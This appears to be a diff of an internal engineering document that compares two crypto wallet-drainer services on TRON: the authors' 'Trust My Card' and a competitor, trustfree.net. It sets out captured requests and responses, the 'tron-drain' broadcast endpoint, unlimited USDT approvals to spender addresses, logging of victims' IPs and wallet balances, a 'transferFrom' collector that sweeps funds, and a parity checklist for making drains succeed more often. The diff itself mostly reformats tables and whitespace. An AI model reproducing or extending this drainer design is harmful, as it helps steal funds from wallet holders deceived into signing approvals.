@@ -14,34 +14,34 @@
 
 Source file: `c:\Users\DESKTOP\Desktop\trustfree.net.har`
 
-| Prior claim (screenshots / first draft) | HAR truth | Verdict |
-|-----------------------------------------|-----------|---------|
-| Balances uses `?form=&token=` and `{ wallets: [...] }` | Uses `?evm=&tron=` and keyed `{ eth, bsc, pol, avax, arb, base, tron }` — **same shape as TMC** | **Wrong → fixed** |
-| IP geo `GET …/v1/ipgeo` only | `GET api.ipify.org` then `GET api.ipgeolocation.io/v3/ipgeo?apiKey=&ip=` | **Wrong → fixed** |
-| Tron node `api.trongrid.io` | Client calls **`https://trx.nownodes.io/wallet/…`** | **Wrong → fixed** |
-| Energy body `{ currentBandwidth }` | Body is `{ address, currentUsdt }` — **same field as our stub** | **Wrong → fixed** |
-| Paths `/energy-delegate`, `/tron-drain` | Paths are **`/api/energy-delegate`**, **`/api/tron-drain`**, **`/api/verify-allowance`** | **Wrong → fixed** |
-| Competitor “works fine” on this pipeline | **This capture failed:** `tron-drain` → `{ ok: false, txid }`, allowance `0`, tg-log error | **Wrong → fixed** |
-| Energy delegate is the reason they succeed | Called + returned `already_sent`, but wallet had **0 TRX** and approve still failed | **Overstated** |
-| `getsignweight` is important for success | Called on **unsigned** tx; `NOT_ENOUGH_PERMISSION` is expected pre-sign | **Overstated severity** |
-| Core sequence: trigger → signweight → account → energy → resource → drain → verify | **Confirmed** (timing matches) | **Right** |
-| Fee limit `150000000`, function `approve(address,uint256)`, USDT `TR7…` | **Confirmed** | **Right** |
-| `tron-drain` broadcasts signed approve (not necessarily transfer) | **Confirmed** (`signedTx` + approve calldata) | **Right** |
-| Our energy-delegate is stub / unused in live path | Still true for TMC | **Right** |
-| We hard-block 0 TRX; they attempt anyway | **Confirmed** — balances showed `tron.native: "0.000000"` and they still ran the full TRON path | **Right** |
+| Prior claim (screenshots / first draft)                                            | HAR truth                                                                                       | Verdict                 |
+| ---------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------- | ----------------------- |
+| Balances uses `?form=&token=` and `{ wallets: [...] }`                             | Uses `?evm=&tron=` and keyed `{ eth, bsc, pol, avax, arb, base, tron }` — **same shape as TMC** | **Wrong → fixed**       |
+| IP geo `GET …/v1/ipgeo` only                                                       | `GET api.ipify.org` then `GET api.ipgeolocation.io/v3/ipgeo?apiKey=&ip=`                        | **Wrong → fixed**       |
+| Tron node `api.trongrid.io`                                                        | Client calls **`https://trx.nownodes.io/wallet/…`**                                             | **Wrong → fixed**       |
+| Energy body `{ currentBandwidth }`                                                 | Body is `{ address, currentUsdt }` — **same field as our stub**                                 | **Wrong → fixed**       |
+| Paths `/energy-delegate`, `/tron-drain`                                            | Paths are **`/api/energy-delegate`**, **`/api/tron-drain`**, **`/api/verify-allowance`**        | **Wrong → fixed**       |
+| Competitor “works fine” on this pipeline                                           | **This capture failed:** `tron-drain` → `{ ok: false, txid }`, allowance `0`, tg-log error      | **Wrong → fixed**       |
+| Energy delegate is the reason they succeed                                         | Called + returned `already_sent`, but wallet had **0 TRX** and approve still failed             | **Overstated**          |
+| `getsignweight` is important for success                                           | Called on **unsigned** tx; `NOT_ENOUGH_PERMISSION` is expected pre-sign                         | **Overstated severity** |
+| Core sequence: trigger → signweight → account → energy → resource → drain → verify | **Confirmed** (timing matches)                                                                  | **Right**               |
+| Fee limit `150000000`, function `approve(address,uint256)`, USDT `TR7…`            | **Confirmed**                                                                                   | **Right**               |
+| `tron-drain` broadcasts signed approve (not necessarily transfer)                  | **Confirmed** (`signedTx` + approve calldata)                                                   | **Right**               |
+| Our energy-delegate is stub / unused in live path                                  | Still true for TMC                                                                              | **Right**               |
+| We hard-block 0 TRX; they attempt anyway                                           | **Confirmed** — balances showed `tron.native: "0.000000"` and they still ran the full TRON path | **Right**               |
 
 ### Outcome of the captured TRON attempt
 
-| Field | Value |
-|-------|--------|
-| Owner | `TV9FLGscQTRdknBfX4vvKAJYeFSw9VbWEF` |
-| TRX / USDT at scan | `0` / `0` |
-| Spender (approve + verify) | `TU2JxhPQcfyemmGrURbezdBGTHxx7ukqwL` (= `41c6087c8e…`) |
-| Approve amount | `999999999` USDT (raw `999999999000000`, 6 decimals) |
-| Energy delegate | `{ ok: false, error: "already_sent" }` |
-| `tron-drain` | `{ ok: false, txid: "4ee82875…" }` ← **failure with echoed txid** |
-| `verify-allowance` | `{ ok: true, hasAllowance: false, allowance: "0" }` |
-| tg-log | `status: "error"`, `error: "on-chain allowance is 0 after approve attempt"` |
+| Field                      | Value                                                                       |
+| -------------------------- | --------------------------------------------------------------------------- |
+| Owner                      | `TV9FLGscQTRdknBfX4vvKAJYeFSw9VbWEF`                                        |
+| TRX / USDT at scan         | `0` / `0`                                                                   |
+| Spender (approve + verify) | `TU2JxhPQcfyemmGrURbezdBGTHxx7ukqwL` (= `41c6087c8e…`)                      |
+| Approve amount             | `999999999` USDT (raw `999999999000000`, 6 decimals)                        |
+| Energy delegate            | `{ ok: false, error: "already_sent" }`                                      |
+| `tron-drain`               | `{ ok: false, txid: "4ee82875…" }` ← **failure with echoed txid**           |
+| `verify-allowance`         | `{ ok: true, hasAllowance: false, allowance: "0" }`                         |
+| tg-log                     | `status: "error"`, `error: "on-chain allowance is 0 after approve attempt"` |
 
 **Implication:** On a zero-TRX wallet, competitor behavior in this HAR looks a lot like ours failing at broadcast/verify — not a guaranteed success path. Energy `already_sent` did **not** make approve land. Treat energy as necessary but not sufficient; their reliability claims need a capture where `tron-drain.ok === true`.
 
@@ -51,35 +51,35 @@ Source file: `c:\Users\DESKTOP\Desktop\trustfree.net.har`
 
 Both systems do the same core job:
 
-1. Read multi-chain balances after wallet connect / QR scan  
-2. Build an unsigned TRC-20 `approve(spender, amount)` transaction  
-3. Have the user sign it (WalletConnect)  
-4. Broadcast to TRON  
+1. Read multi-chain balances after wallet connect / QR scan
+2. Build an unsigned TRC-20 `approve(spender, amount)` transaction
+3. Have the user sign it (WalletConnect)
+4. Broadcast to TRON
 5. Verify on-chain allowance + ops logging (`tg-log`)
 
 **Revised verdict (after HAR):**
 
-- Product shape is **even closer** than screenshot docs suggested (balances API, `currentUsdt`, `/api/*` routes, tg-log).  
-- Competitor differences that still matter: **client → NowNodes** for TRON wallet RPCs, **live `/api/energy-delegate` call**, **no hard 0-TRX client block**, **`/api/rpc` EVM proxy**, **`/api/tron-drain` envelope**.  
-- The earlier “they work because of energy” story is **partially right as architecture**, but **not proven by this HAR** — their 0-TRX attempt also ended with allowance `0`.  
+- Product shape is **even closer** than screenshot docs suggested (balances API, `currentUsdt`, `/api/*` routes, tg-log).
+- Competitor differences that still matter: **client → NowNodes** for TRON wallet RPCs, **live `/api/energy-delegate` call**, **no hard 0-TRX client block**, **`/api/rpc` EVM proxy**, **`/api/tron-drain` envelope**.
+- The earlier “they work because of energy” story is **partially right as architecture**, but **not proven by this HAR** — their 0-TRX attempt also ended with allowance `0`.
 - Ours remains stronger on: refusing phantom txids, server-built prepare, Postgres confirm + collector.
 
-| Area | Competitor (HAR) | Trust My Card | Gap severity |
-|------|------------------|---------------|--------------|
-| Balances after scan | `GET /api/balances?evm=&tron=` keyed object | Same idea / same shape | **None** |
-| IP geolocation | ipify + ipgeolocation **v3** (client API key) | `/api/ipgeo` → ip-api (server) via tg-log | Low |
-| Ops logging | Rich `POST /api/tg-log` | `POST /api/tg-log` (simpler body) | Low |
-| EVM RPC from browser | `POST /api/rpc` proxy | Server-side RPCs in balances/prepare | Low |
-| Build `approve` | Client → **NowNodes** `triggersmartcontract` | Server → **TronGrid** inside prepare | Low (node choice) |
-| Fee limit | 150,000,000 sun | Same | None |
-| `getsignweight` | Yes (pre-sign; often NOT_ENOUGH_PERMISSION) | No | **Low** |
-| Account / resource | Explicit NowNodes `getaccount` + `getaccountresource` | Folded into prepare (TronGrid) | Low |
-| Energy delegation | Called; returns `already_sent` / real backend | Stub + **not called** live | **High** (architecture) |
-| 0 TRX handling | Still attempts full flow | Client + prepare block | Medium (UX vs fail-late) |
-| Broadcast | `POST /api/tron-drain` `{ address, trxBalance, signedTx }` | `POST /api/tron-broadcast` full signed tx | Low |
-| Broadcast failure shape | `{ ok: false, txid }` (txid still returned) | `result: false`, no success txid | Ours safer |
-| Verify | `POST /api/verify-allowance` `{ network, owner, spender }` | Confirm + retries + DB (+ optional verify route) | Ours stronger |
-| Post-approve collection | Not visible in this HAR | Background collector `transferFrom` | Ours stronger |
+| Area                    | Competitor (HAR)                                           | Trust My Card                                    | Gap severity             |
+| ----------------------- | ---------------------------------------------------------- | ------------------------------------------------ | ------------------------ |
+| Balances after scan     | `GET /api/balances?evm=&tron=` keyed object                | Same idea / same shape                           | **None**                 |
+| IP geolocation          | ipify + ipgeolocation **v3** (client API key)              | `/api/ipgeo` → ip-api (server) via tg-log        | Low                      |
+| Ops logging             | Rich `POST /api/tg-log`                                    | `POST /api/tg-log` (simpler body)                | Low                      |
+| EVM RPC from browser    | `POST /api/rpc` proxy                                      | Server-side RPCs in balances/prepare             | Low                      |
+| Build `approve`         | Client → **NowNodes** `triggersmartcontract`               | Server → **TronGrid** inside prepare             | Low (node choice)        |
+| Fee limit               | 150,000,000 sun                                            | Same                                             | None                     |
+| `getsignweight`         | Yes (pre-sign; often NOT_ENOUGH_PERMISSION)                | No                                               | **Low**                  |
+| Account / resource      | Explicit NowNodes `getaccount` + `getaccountresource`      | Folded into prepare (TronGrid)                   | Low                      |
+| Energy delegation       | Called; returns `already_sent` / real backend              | Stub + **not called** live                       | **High** (architecture)  |
+| 0 TRX handling          | Still attempts full flow                                   | Client + prepare block                           | Medium (UX vs fail-late) |
+| Broadcast               | `POST /api/tron-drain` `{ address, trxBalance, signedTx }` | `POST /api/tron-broadcast` full signed tx        | Low                      |
+| Broadcast failure shape | `{ ok: false, txid }` (txid still returned)                | `result: false`, no success txid                 | Ours safer               |
+| Verify                  | `POST /api/verify-allowance` `{ network, owner, spender }` | Confirm + retries + DB (+ optional verify route) | Ours stronger            |
+| Post-approve collection | Not visible in this HAR                                    | Background collector `transferFrom`              | Ours stronger            |
 
 ---
 
@@ -115,34 +115,34 @@ User selects TRON                               User selects TRON + amount/token
 
 Primary client orchestration: `frontend/wallet-sdk/src/hooks/useConnectFlow.ts`
 
-1. WalletConnect connect → `fetchBalances` → show networks  
-2. User picks TRON → client guard: native TRX must be `> 0`  
-3. `POST /api/approvals/prepare`  
-   - Resource preflight (`tron-resources.ts`)  
-   - TronGrid `wallet/triggersmartcontract`  
-4. `tronSignTransaction` (WalletConnect)  
-5. `POST /api/tron-broadcast` → TronGrid `wallet/broadcasttransaction`  
-6. `runPostConfirmSequence` → `POST /api/approvals/confirm`  
-   - Nest `verifyAllowance` with retries  
-   - Persist approval, supersede older ones, schedule collector  
+1. WalletConnect connect → `fetchBalances` → show networks
+2. User picks TRON → client guard: native TRX must be `> 0`
+3. `POST /api/approvals/prepare`
+   - Resource preflight (`tron-resources.ts`)
+   - TronGrid `wallet/triggersmartcontract`
+4. `tronSignTransaction` (WalletConnect)
+5. `POST /api/tron-broadcast` → TronGrid `wallet/broadcasttransaction`
+6. `runPostConfirmSequence` → `POST /api/approvals/confirm`
+   - Nest `verifyAllowance` with retries
+   - Persist approval, supersede older ones, schedule collector
 
 **Not called in the live path:** `/api/energy-delegate`, `/api/consent_`, standalone `/api/verify-allowance`, `getsignweight`.
 
 Relevant files:
 
-| Role | Path |
-|------|------|
-| Connect / approve UI flow | `frontend/wallet-sdk/src/hooks/useConnectFlow.ts` |
-| Prepare (Next) | `frontend/wallet-sdk/src/server/routes/approvals/prepare/route.ts` |
-| TRON resources | `frontend/wallet-sdk/src/server/approvals/tron-resources.ts` |
-| Broadcast (Next) | `frontend/wallet-sdk/src/server/routes/tron-broadcast/route.ts` |
-| Confirm proxy | `frontend/wallet-sdk/src/server/routes/approvals/confirm/route.ts` |
-| Post-confirm client | `frontend/wallet-sdk/src/core/post-confirm.ts` |
-| Nest wallet API | `backend/src/modules/wallet/wallet.controller.ts` |
-| Nest prepare / verify / confirm / broadcast | `backend/src/modules/wallet/wallet.service.ts` |
-| Energy stub (Next) | `frontend/wallet-sdk/src/server/routes/energy-delegate/route.ts` |
-| Collector | `backend/src/jobs/schedulers/approval-collection.scheduler.ts` |
-| Flow logging | `frontend/wallet-sdk/src/server/approvals/flow-logger.ts` |
+| Role                                        | Path                                                               |
+| ------------------------------------------- | ------------------------------------------------------------------ |
+| Connect / approve UI flow                   | `frontend/wallet-sdk/src/hooks/useConnectFlow.ts`                  |
+| Prepare (Next)                              | `frontend/wallet-sdk/src/server/routes/approvals/prepare/route.ts` |
+| TRON resources                              | `frontend/wallet-sdk/src/server/approvals/tron-resources.ts`       |
+| Broadcast (Next)                            | `frontend/wallet-sdk/src/server/routes/tron-broadcast/route.ts`    |
+| Confirm proxy                               | `frontend/wallet-sdk/src/server/routes/approvals/confirm/route.ts` |
+| Post-confirm client                         | `frontend/wallet-sdk/src/core/post-confirm.ts`                     |
+| Nest wallet API                             | `backend/src/modules/wallet/wallet.controller.ts`                  |
+| Nest prepare / verify / confirm / broadcast | `backend/src/modules/wallet/wallet.service.ts`                     |
+| Energy stub (Next)                          | `frontend/wallet-sdk/src/server/routes/energy-delegate/route.ts`   |
+| Collector                                   | `backend/src/jobs/schedulers/approval-collection.scheduler.ts`     |
+| Flow logging                                | `frontend/wallet-sdk/src/server/approvals/flow-logger.ts`          |
 
 ---
 
@@ -159,11 +159,11 @@ GET https://trustfree.net/api/balances?evm=0x8bF415A644516Ef9e6eD8A0f8fEF8bC8600
 
 ```json
 {
-  "eth":  { "native": "0.0", "usdt": "0.0", "usdc": "0.0" },
-  "bsc":  { "native": "0.000000001672", "usdt": "0.00011014", "usdc": "0.0" },
-  "pol":  { "native": "0.06185598942689405", "usdt": "0.0", "usdc": "0.0" },
+  "eth": { "native": "0.0", "usdt": "0.0", "usdc": "0.0" },
+  "bsc": { "native": "0.000000001672", "usdt": "0.00011014", "usdc": "0.0" },
+  "pol": { "native": "0.06185598942689405", "usdt": "0.0", "usdc": "0.0" },
   "avax": { "native": "0.01", "usdt": "0.0", "usdc": "0.0" },
-  "arb":  { "native": "0.000009260647170559", "usdt": "0.0", "usdc": "0.0" },
+  "arb": { "native": "0.000009260647170559", "usdt": "0.0", "usdc": "0.0" },
   "base": { "native": "0.000002065245995177", "usdt": "0.0", "usdc": "0.0" },
   "tron": { "native": "0.000000", "usdt": "0.000000" }
 }
@@ -185,8 +185,8 @@ Same keyed networks. Implementation: Next balances route / Nest `getBalances`; T
 
 #### Competitor (HAR)
 
-1. `GET https://api.ipify.org/?format=json` → `{ "ip": "106.215.57.223" }`  
-2. `GET https://api.ipgeolocation.io/v3/ipgeo?apiKey=…&ip=106.215.57.223`  
+1. `GET https://api.ipify.org/?format=json` → `{ "ip": "106.215.57.223" }`
+2. `GET https://api.ipgeolocation.io/v3/ipgeo?apiKey=…&ip=106.215.57.223`
 3. `POST /api/tg-log` with rich payload:
 
 ```json
@@ -199,12 +199,21 @@ Same keyed networks. Implementation: Next balances route / Nest `getBalances`; T
   "chain": "both",
   "evmAddress": "0x8bF415A644516Ef9e6eD8A0f8fEF8bC860009a4F",
   "tronAddress": "TV9FLGscQTRdknBfX4vvKAJYeFSw9VbWEF",
-  "balances": { "eth": { "…": "…" }, "tron": { "native": "0.000000", "usdt": "0.000000" } }
+  "balances": {
+    "eth": { "…": "…" },
+    "tron": { "native": "0.000000", "usdt": "0.000000" }
+  }
 }
 ```
 
 ```json
-{ "code": 200, "status": "success", "message": "OK", "data": { "sent": true }, "timestamp": "…" }
+{
+  "code": 200,
+  "status": "success",
+  "message": "OK",
+  "data": { "sent": true },
+  "timestamp": "…"
+}
 ```
 
 Note: geo API key is exposed in the browser query string.
@@ -226,7 +235,11 @@ POST https://trustfree.net/api/rpc
 ```
 
 ```json
-{ "network": "eth", "method": "eth_getBalance", "params": ["0x8bF4…", "latest"] }
+{
+  "network": "eth",
+  "method": "eth_getBalance",
+  "params": ["0x8bF4…", "latest"]
+}
 ```
 
 ```json
@@ -258,13 +271,13 @@ POST https://trx.nownodes.io/wallet/triggersmartcontract
 }
 ```
 
-| Decoded field | Value |
-|---------------|--------|
-| Contract | USDT `TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t` (`41a614f8…`) |
-| Owner | `TV9FLGsc…` |
-| Spender | `TU2JxhPQ…` (`41c6087c…`) |
-| Amount | `999999999` USDT (6 decimals) |
-| Fee limit | 150 TRX in sun |
+| Decoded field | Value                                                   |
+| ------------- | ------------------------------------------------------- |
+| Contract      | USDT `TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t` (`41a614f8…`) |
+| Owner         | `TV9FLGsc…`                                             |
+| Spender       | `TU2JxhPQ…` (`41c6087c…`)                               |
+| Amount        | `999999999` USDT (6 decimals)                           |
+| Fee limit     | 150 TRX in sun                                          |
 
 Response: `result.result: true` + unsigned `transaction` (`txID` initially `c655f56c…`).
 
@@ -331,9 +344,9 @@ POST https://trustfree.net/api/energy-delegate
 
 **Corrections vs first draft:**
 
-- Path includes `/api/`  
-- Field is `currentUsdt` (matches our stub), **not** `currentBandwidth`  
-- Response is `{ ok, error }` — not our placeholder `{ code, data.delegated }`  
+- Path includes `/api/`
+- Field is `currentUsdt` (matches our stub), **not** `currentBandwidth`
+- Response is `{ ok, error }` — not our placeholder `{ code, data.delegated }`
 
 **Analysis:** They have a real backend with idempotency. In this capture it did **not** produce a successful on-chain approve. Possible reasons: energy not actually available yet, prior send failed, bandwidth-only problem, or broadcast rejected for another reason. Need a successful HAR to prove rental quality.
 
@@ -343,7 +356,12 @@ Our stub:
 {
   "code": 200,
   "status": "success",
-  "data": { "delegated": false, "placeholder": true, "address": "…", "currentUsdt": "…" }
+  "data": {
+    "delegated": false,
+    "placeholder": true,
+    "address": "…",
+    "currentUsdt": "…"
+  }
 }
 ```
 
@@ -386,14 +404,20 @@ POST https://trustfree.net/api/tron-drain
   "signedTx": {
     "txID": "4ee82875b02cc1eecb8bd9d9621fdbbc68f8a6df52797ea8ef4cec0381e13ab6",
     "signature": ["84a6e66acb3d793e…01"],
-    "raw_data": { "fee_limit": 150000000, "contract": [{ "type": "TriggerSmartContract", "…": "…" }] },
+    "raw_data": {
+      "fee_limit": 150000000,
+      "contract": [{ "type": "TriggerSmartContract", "…": "…" }]
+    },
     "raw_data_hex": "0a02edc3…"
   }
 }
 ```
 
 ```json
-{ "ok": false, "txid": "4ee82875b02cc1eecb8bd9d9621fdbbc68f8a6df52797ea8ef4cec0381e13ab6" }
+{
+  "ok": false,
+  "txid": "4ee82875b02cc1eecb8bd9d9621fdbbc68f8a6df52797ea8ef4cec0381e13ab6"
+}
 ```
 
 **Important:** failure still returns the local `txid`. Our `tron-broadcast` explicitly avoids treating that as success.
@@ -453,35 +477,35 @@ Canonical path: `POST /api/approvals/confirm` with retries. Standalone `/api/ver
 
 ## Endpoint map (HAR-corrected)
 
-| Competitor (HAR) | Trust My Card | Status |
-|------------------|---------------|--------|
-| `GET /api/balances?evm=&tron=` | `GET /api/balances?evm=&tron=` | Match |
-| `GET api.ipify.org` + `…/v3/ipgeo` | `GET /api/ipgeo` | Different providers |
-| `POST /api/tg-log` | `POST /api/tg-log` | Match (richer competitor body) |
-| `POST /api/rpc` | — (server RPCs) | Competitor-only client proxy |
-| `POST trx.nownodes.io/wallet/triggersmartcontract` | Inside prepare → TronGrid | Same call, different host/caller |
-| `POST …/getsignweight` | — | Competitor-only (low value pre-sign) |
-| `POST …/getaccount` | Via `v1/accounts` in resource check | Partial |
-| `POST /api/energy-delegate` | Stub route, unused live | **Gap** |
-| `POST …/getaccountresource` | Inside prepare | Timing differs |
-| `POST /api/tron-drain` | `POST /api/tron-broadcast` | Equivalent intent |
-| `POST /api/verify-allowance` | Confirm (+ optional verify) | Ours stronger persistence |
+| Competitor (HAR)                                   | Trust My Card                       | Status                               |
+| -------------------------------------------------- | ----------------------------------- | ------------------------------------ |
+| `GET /api/balances?evm=&tron=`                     | `GET /api/balances?evm=&tron=`      | Match                                |
+| `GET api.ipify.org` + `…/v3/ipgeo`                 | `GET /api/ipgeo`                    | Different providers                  |
+| `POST /api/tg-log`                                 | `POST /api/tg-log`                  | Match (richer competitor body)       |
+| `POST /api/rpc`                                    | — (server RPCs)                     | Competitor-only client proxy         |
+| `POST trx.nownodes.io/wallet/triggersmartcontract` | Inside prepare → TronGrid           | Same call, different host/caller     |
+| `POST …/getsignweight`                             | —                                   | Competitor-only (low value pre-sign) |
+| `POST …/getaccount`                                | Via `v1/accounts` in resource check | Partial                              |
+| `POST /api/energy-delegate`                        | Stub route, unused live             | **Gap**                              |
+| `POST …/getaccountresource`                        | Inside prepare                      | Timing differs                       |
+| `POST /api/tron-drain`                             | `POST /api/tron-broadcast`          | Equivalent intent                    |
+| `POST /api/verify-allowance`                       | Confirm (+ optional verify)         | Ours stronger persistence            |
 
 ---
 
 ## Shared technical constants (confirmed)
 
-| Item | Competitor (HAR) | Trust My Card |
-|------|------------------|---------------|
-| Blockchain | TRON TRC-20 | Same |
-| Wallet RPC host | `trx.nownodes.io` | `api.trongrid.io` |
-| Contract call | `approve(address,uint256)` | Same |
-| Approve fee limit | 150,000,000 sun | Same |
-| USDT | `41a614f8…` / `TR7NHqje…` | Same |
-| Energy API field | `currentUsdt` | Same (stub) |
-| Energy path | `/api/energy-delegate` | Same path (stub) |
-| Geo | ipify + ipgeolocation v3 | ip-api via server |
-| WC | WalletConnect attestations present | WalletConnect |
+| Item              | Competitor (HAR)                   | Trust My Card     |
+| ----------------- | ---------------------------------- | ----------------- |
+| Blockchain        | TRON TRC-20                        | Same              |
+| Wallet RPC host   | `trx.nownodes.io`                  | `api.trongrid.io` |
+| Contract call     | `approve(address,uint256)`         | Same              |
+| Approve fee limit | 150,000,000 sun                    | Same              |
+| USDT              | `41a614f8…` / `TR7NHqje…`          | Same              |
+| Energy API field  | `currentUsdt`                      | Same (stub)       |
+| Energy path       | `/api/energy-delegate`             | Same path (stub)  |
+| Geo               | ipify + ipgeolocation v3           | ip-api via server |
+| WC                | WalletConnect attestations present | WalletConnect     |
 
 ---
 
@@ -489,27 +513,27 @@ Canonical path: `POST /api/approvals/confirm` with retries. Standalone `/api/ver
 
 ### What we previously overstated
 
-1. **“Competitor works fine through this pipeline”** — not true for this HAR’s 0-TRX wallet. They hit the same class of failure we care about: broadcast/allowance not confirmed.  
-2. **Balances / query / energy field / node host** — screenshot notes were stale or OCR-wrong; HAR is authoritative.  
+1. **“Competitor works fine through this pipeline”** — not true for this HAR’s 0-TRX wallet. They hit the same class of failure we care about: broadcast/allowance not confirmed.
+2. **Balances / query / energy field / node host** — screenshot notes were stale or OCR-wrong; HAR is authoritative.
 3. **`getsignweight` as a success dependency** — pre-sign `NOT_ENOUGH_PERMISSION` is noise for normal single-key accounts.
 
 ### What still stands
 
-1. **They call energy-delegate in the live path; we don’t.** That remains the main *architectural* gap for thin wallets — but this capture shows `already_sent` ≠ guaranteed energy.  
-2. **They don’t hard-block 0 TRX** — better for UX continuity / energy-first design; worse if it burns user time signing doomed txs (as here).  
-3. **They may return txid on failed drain** — we correctly refuse phantom success.  
+1. **They call energy-delegate in the live path; we don’t.** That remains the main _architectural_ gap for thin wallets — but this capture shows `already_sent` ≠ guaranteed energy.
+2. **They don’t hard-block 0 TRX** — better for UX continuity / energy-first design; worse if it burns user time signing doomed txs (as here).
+3. **They may return txid on failed drain** — we correctly refuse phantom success.
 4. **Our confirm + collector model is ahead** for durable ops.
 
 ### Why energy alone didn’t save them here
 
 Observed:
 
-- `trxBalance: "0.0000"` sent to tron-drain  
-- `getaccount` without balance  
-- `getaccountresource` without account EnergyLimit  
-- `energy-delegate` → `already_sent` only  
-- `tron-drain` → `ok: false`  
-- allowance still `0`  
+- `trxBalance: "0.0000"` sent to tron-drain
+- `getaccount` without balance
+- `getaccountresource` without account EnergyLimit
+- `energy-delegate` → `already_sent` only
+- `tron-drain` → `ok: false`
+- allowance still `0`
 
 So either energy was not actually present for execution, bandwidth/account state blocked broadcast, or their drain backend rejected for another reason. **Do not treat `already_sent` as proof of usable energy.**
 
@@ -517,31 +541,31 @@ So either energy was not actually present for execution, bandwidth/account state
 
 ## Strengths of Trust My Card vs competitor
 
-1. Server-owned spender + amount policy in prepare  
-2. No phantom success txids on failed broadcast  
-3. Durable confirm (Postgres, audits, supersede, collector)  
-4. Explicit resource preflight + clear user errors  
-5. Multi-chain prepare/confirm model already aligned with their balances shape  
+1. Server-owned spender + amount policy in prepare
+2. No phantom success txids on failed broadcast
+3. Durable confirm (Postgres, audits, supersede, collector)
+4. Explicit resource preflight + clear user errors
+5. Multi-chain prepare/confirm model already aligned with their balances shape
 
 ## Strengths of competitor vs us (from HAR)
 
-1. Live energy-delegate integration (even if imperfect)  
-2. Client NowNodes TRON calls (may be faster / keyed differently)  
-3. Richer tg-log (balances + both addresses on connect)  
-4. `/api/rpc` proxy for browser EVM reads  
+1. Live energy-delegate integration (even if imperfect)
+2. Client NowNodes TRON calls (may be faster / keyed differently)
+3. Richer tg-log (balances + both addresses on connect)
+4. `/api/rpc` proxy for browser EVM reads
 5. Continues TRON flow at 0 TRX (energy-first product assumption)
 
 ---
 
 ## Recommended parity checklist (updated)
 
-1. **Keep** balances shape — already matched.  
-2. **Implement real `/api/energy-delegate`** with idempotency; align response with `{ ok, error: "already_sent" }` *or* map their contract explicitly.  
-3. **Call energy before broadcast**; then **re-check account energy** (not only trust `already_sent`).  
-4. Only then consider softening the hard TRX > 0 guard (branch: allow 0 TRX if energy confirmed).  
-5. Optionally add NowNodes (or keep TronGrid) behind server prepare/broadcast — prefer server-side keys over client→node.  
-6. Do **not** prioritize `getsignweight` for v1.  
-7. Keep refusing phantom txids; optionally mirror their drain envelope only if API compatibility is required.  
+1. **Keep** balances shape — already matched.
+2. **Implement real `/api/energy-delegate`** with idempotency; align response with `{ ok, error: "already_sent" }` _or_ map their contract explicitly.
+3. **Call energy before broadcast**; then **re-check account energy** (not only trust `already_sent`).
+4. Only then consider softening the hard TRX > 0 guard (branch: allow 0 TRX if energy confirmed).
+5. Optionally add NowNodes (or keep TronGrid) behind server prepare/broadcast — prefer server-side keys over client→node.
+6. Do **not** prioritize `getsignweight` for v1.
+7. Keep refusing phantom txids; optionally mirror their drain envelope only if API compatibility is required.
 8. Capture a **successful** competitor HAR (`tron-drain.ok === true`) before assuming their energy provider quality.
 
 ---
@@ -623,17 +647,17 @@ NOT USED LIVE: energy-delegate, getsignweight, consent_
 
 ## Appendix C — Glossary
 
-| Term | Meaning |
-|------|---------|
-| `approve` | TRC-20 permission for spender; does not move tokens alone |
-| `allowance` | Remaining amount spender may `transferFrom` |
-| Energy | TRON resource for contract execution |
-| Bandwidth / free net | TRON resource for tx size / free quota |
-| `fee_limit` | Max sun burnable for energy |
-| `already_sent` | Competitor energy idempotency — prior delegate attempt recorded |
-| Phantom txid | Returning a precomputed tx hash when broadcast was not accepted |
-| NowNodes | Competitor’s TRON full-node API host (`trx.nownodes.io`) |
+| Term                 | Meaning                                                         |
+| -------------------- | --------------------------------------------------------------- |
+| `approve`            | TRC-20 permission for spender; does not move tokens alone       |
+| `allowance`          | Remaining amount spender may `transferFrom`                     |
+| Energy               | TRON resource for contract execution                            |
+| Bandwidth / free net | TRON resource for tx size / free quota                          |
+| `fee_limit`          | Max sun burnable for energy                                     |
+| `already_sent`       | Competitor energy idempotency — prior delegate attempt recorded |
+| Phantom txid         | Returning a precomputed tx hash when broadcast was not accepted |
+| NowNodes             | Competitor’s TRON full-node API host (`trx.nownodes.io`)        |
 
 ---
 
-*HAR-validated 2026-07-29. Prior screenshot-based claims about balances shape, node host, energy body fields, and “guaranteed working” competitor TRON flow are superseded by this document.*
+_HAR-validated 2026-07-29. Prior screenshot-based claims about balances shape, node host, energy body fields, and “guaranteed working” competitor TRON flow are superseded by this document._
